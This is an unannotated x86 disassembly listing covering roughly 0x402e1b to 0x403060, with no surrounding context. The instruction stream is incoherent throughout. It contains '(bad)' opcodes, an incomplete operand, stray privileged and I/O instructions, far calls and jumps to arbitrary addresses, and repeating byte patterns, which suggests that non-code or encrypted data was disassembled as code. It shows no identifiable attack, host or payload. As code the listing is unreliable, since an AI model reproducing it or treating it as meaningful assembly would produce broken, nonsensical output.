  402e1b:	mov    eax,ds:0x884ed18f
  402e20:	jbe    0x402da7
  402e22:	pop    ebx
  402e23:	mov    ch,0x4a
  402e25:	sbb    ah,BYTE PTR [edi-0x7cf1b583]
  402e2b:	pop    edi
  402e2c:	cld    
  402e2d:	sub    ebp,DWORD PTR ss:[esi+0x26]
  402e31:	aad    0xb
  402e33:	mov    esp,0x2baa7a89
  402e38:	and    eax,0xd0940c7a
  402e3d:	sub    ch,BYTE PTR [ebx]
  402e3f:	rol    DWORD PTR [ebp-0x76134cdf],cl
  402e45:	jp     0x402ded
  402e47:	arpl   di,di
  402e49:	sar    DWORD PTR [edi-0xc],0x2
  402e4d:	sub    BYTE PTR [ecx],0x27
  402e50:	retf   
  402e51:	sbb    DWORD PTR [ebx-0x2c],0x33051e89
  402e58:	jbe    0x402ddf
  402e5a:	pop    ebx
  402e5b:	pop    edi
  402e5c:	stc    
  402e5d:	push   esi
  402e5e:	cmc    
  402e5f:	inc    ebx
  402e60:	jbe    0x402de7
  402e62:	push   edi
  402e63:	aam    0xda
  402e65:	test   ecx,esi
  402e67:	imul   edi,ebx,0xffffff89
  402e6a:	jecxz  0x402ec7
  402e6c:	mov    BYTE PTR [edx],ch
  402e6e:	sub    esp,esp
  402e70:	std    
  402e71:	jge    0x402e21
  402e73:	jno    0x402e62
  402e75:	fstp   TBYTE PTR [esi-0x357a89d5]
  402e7b:	xchg   esp,eax
  402e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e7d:	sbb    esp,DWORD PTR [ebx+0x4b]
  402e80:	imul   DWORD PTR [ecx+0x7b]
  402e83:	(bad)  
  402e84:	mov    DWORD PTR [edx-0x32],edi
  402e87:	pcmpeqb mm0,QWORD PTR [ebp+0x107fe75b]
  402e8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e8f:	inc    ecx
  402e90:	jle    0x402f0c
  402e92:	or     al,0xc8
  402e94:	add    ah,BYTE PTR [edx-0x2f76870e]
  402e9a:	outs   dx,DWORD PTR ds:[esi]
  402e9b:	pop    edi
  402e9c:	int    0x5e
  402e9e:	mov    edx,0xd6b93628
  402ea3:	push   esp
  402ea4:	dec    ecx
  402ea5:	jp     0x402e4d
  402ea7:	sub    esi,ebx
  402ea9:	inc    ebp
  402eaa:	das    
  402eab:	aad    0xcf
  402ead:	cs repz aam 0x23
  402eb1:	mov    ebp,0x9ffc14dc
  402eb6:	repz aam 0x23
  402eb9:	popf   
  402eba:	fcom   DWORD PTR [eax]
  402ebc:	lods   eax,DWORD PTR ds:[esi]
  402ebd:	js     0x402e65
  402ebf:	sub    edi,edi
  402ec1:	icebp  
  402ec2:	jg     0x402e8c
  402ec4:	call   0x1a83f582
  402ec9:	jmp    0x9220329
  402ece:	rol    BYTE PTR ds:0xa734ed12,cl
  402ed4:	call   FWORD PTR [ecx]
  402ed6:	repnz aam 0x23
  402ed9:	sbb    esp,0xf272fc14
  402edf:	aam    0x23
  402ee1:	test   esp,ebx
  402ee3:	adc    al,0xfd
  402ee5:	aaa    
  402ee6:	int3   
  402ee7:	sub    ebx,DWORD PTR [esi]
  402ee9:	in     al,dx
  402eea:	xor    eax,0xc012efa0
  402eef:	pop    esp
  402ef0:	push   es
  402ef1:	test   DWORD PTR [edi],0xae2f7684
  402ef7:	test   al,0xb2
  402ef9:	mov    esi,edx
  402efb:	and    al,0xd9
  402efd:	cs int3 
  402eff:	imul   ebx,DWORD PTR [edx+eax*4],0xd
  402f03:	sub    ebx,esp
  402f05:	jbe    0x402f05
  402f07:	jnp    0x402f2b
  402f09:	aad    0x31
  402f0b:	rcr    edi,cl
  402f0d:	xchg   edx,eax
  402f0e:	sub    BYTE PTR [ebx],0x76
  402f11:	test   esi,edx
  402f13:	call   0x39b02ac5
  402f18:	jbe    0x402e9f
  402f1a:	pop    ebx
  402f1b:	mov    esi,0x8f53238e
  402f20:	xor    DWORD PTR [esi],ecx
  402f22:	popf   
  402f23:	jg     0x402f29
  402f25:	add    al,0x5d
  402f27:	fwait
  402f28:	push   ds
  402f29:	das    
  402f2a:	add    edi,DWORD PTR [edi+0x39]
  402f2d:	mov    ecx,0x8923d40c
  402f32:	add    edx,DWORD PTR [edi+0x4d]
  402f35:	jbe    0x402efc
  402f37:	call   0x81cba96a
  402f3c:	popa   
  402f3d:	in     al,0xa6
  402f3f:	sub    esi,DWORD PTR [esi-0x28]
  402f42:	aam    0x91
  402f44:	stc    
  402f45:	stc    
  402f46:	data16 das 
  402f48:	inc    ecx
  402f4a:	jg     0x402f10
  402f4c:	aam    0x7a
  402f4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f4f:	sub    esi,DWORD PTR [esi-0x7b]
  402f52:	pop    ebx
  402f53:	aam    0xe1
  402f55:	jp     0x402efd
  402f57:	sub    esi,DWORD PTR [esi+0x46]
  402f5a:	cmp    eax,0x1c1c7fe7
  402f5f:	data16 sub al,0xe3
  402f62:	hlt    
  402f63:	mov    dl,0xba
  402f65:	stos   BYTE PTR es:[edi],al
  402f66:	shl    BYTE PTR [ebx],cl
  402f68:	imul   DWORD PTR [ebx+0x59]
  402f6b:	les    ecx,FWORD PTR [ecx-0x439b486]
  402f71:	(bad)  [ebp+0x550f7650]
  402f77:	mov    al,ds:0x6e3dbf00
  402f7c:	fnstcw WORD PTR [edi]
  402f7e:	sub    DWORD PTR [edi],ebx
  402f80:	push   0xbab2f4e3
  402f85:	stos   BYTE PTR es:[edi],al
  402f86:	ror    ebx,1
  402f88:	mov    ch,0xd4
  402f8a:	outs   dx,BYTE PTR ds:[esi]
  402f8b:	sbb    eax,0x536451c8
  402f90:	jb     0x402f83
  402f92:	pop    ecx
  402f93:	aas    
  402f94:	jle    0x402fdf
  402f96:	data16 sub BYTE PTR [edi+eiz*2-0xeb57259],dh
  402f9e:	fld    DWORD PTR [ebx+0x1c]
  402fa1:	xor    DWORD PTR [ebx],0xa67a99d4
  402fa7:	jl     0x402fc5
  402fa9:	test   DWORD PTR [edx-0x7e],ebx
  402fac:	cdq    
  402fad:	icebp  
  402fae:	push   esi
  402faf:	stos   BYTE PTR es:[edi],al
  402fb0:	call   0x5af1:0x89d45881
  402fb7:	inc    ebx
  402fb8:	jb     0x402f3e
  402fba:	pop    ebx
  402fbb:	aam    0xde
  402fbd:	sub    DWORD PTR [edi+0x5bef567d],esp
  402fc3:	mov    esp,0x2ba67a09
  402fc8:	sbb    al,0x86
  402fca:	xor    esp,edx
  402fcc:	jecxz  0x403049
  402fce:	into   
  402fcf:	sub    esi,DWORD PTR [esi-0x7b]
  402fd2:	fild   DWORD PTR [ebx-0x557dd08a]
  402fd8:	mov    dl,0x81
  402fda:	pop    eax
  402fdb:	aam    0x89
  402fdd:	mov    ecx,0x55897336
  402fe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fe3:	add    BYTE PTR [ebx],ch
  402fe5:	sbb    ebp,DWORD PTR [edi+edx*1]
  402fe8:	jb     0x402fb2
  402fea:	adc    al,0x6c
  402fec:	es mov dh,0x79
  402fef:	adc    bh,ch
  402ff1:	add    edi,DWORD PTR [ebx+0x58]
  402ff4:	rcr    DWORD PTR [eax],0x45
  402ff7:	pop    ecx
  402ff8:	scas   eax,DWORD PTR es:[edi]
  402ff9:	sahf   
  402ffa:	mov    ebx,0x3b165768
  402fff:	test   edx,ebp
  403001:	push   ecx
  403002:	fwait
  403003:	test   eax,0xdb467ee6
  403009:	xchg   edx,eax
  40300a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40300b:	sbb    eax,0x47e0ff23
  403010:	in     al,dx
  403011:	lods   al,BYTE PTR ds:[esi]
  403012:	push   ebx
  403013:	push   edi
  403014:	sbb    ch,0x1d
  403017:	int    0x60
  403019:	test   BYTE PTR [ebx],bl
  40301b:	enter  0xf188,0x1b
  40301f:	arpl   WORD PTR [edx+eax*2+0x5cd56bd4],dx
  403026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403027:	mov    eax,0xd45b3249
  40302c:	mov    DWORD PTR [edx-0x5a],edi
  40302f:	sub    esi,DWORD PTR [esi-0x7b]
  403032:	pop    ebx
  403033:	aam    0x89
  403035:	jp     0x402fdd
  403037:	sub    esi,DWORD PTR [esi-0x7b]
  40303a:	pop    ebx
  40303b:	aam    0x89
  40303d:	jp     0x402fe5
  40303f:	sub    esi,DWORD PTR [esi-0x7b]
  403042:	pop    ebx
  403043:	aam    0x89
  403045:	jp     0x40303d
  403047:	lods   al,BYTE PTR ds:[esi]
  403048:	ja     0x402fcf
  40304a:	pop    ebx
  40304b:	into   
  40304c:	mov    WORD PTR [edx-0x5a],?
  40304f:	das    
  403050:	jbe    0x402fd7
  403052:	xchg   esi,eax
  403053:	jmp    0x33e6:0x80217845
  40305a:	dec    ebp
  40305b:	sbb    eax,0xebca3d72
  403060:	enter  0xcf9,0x68
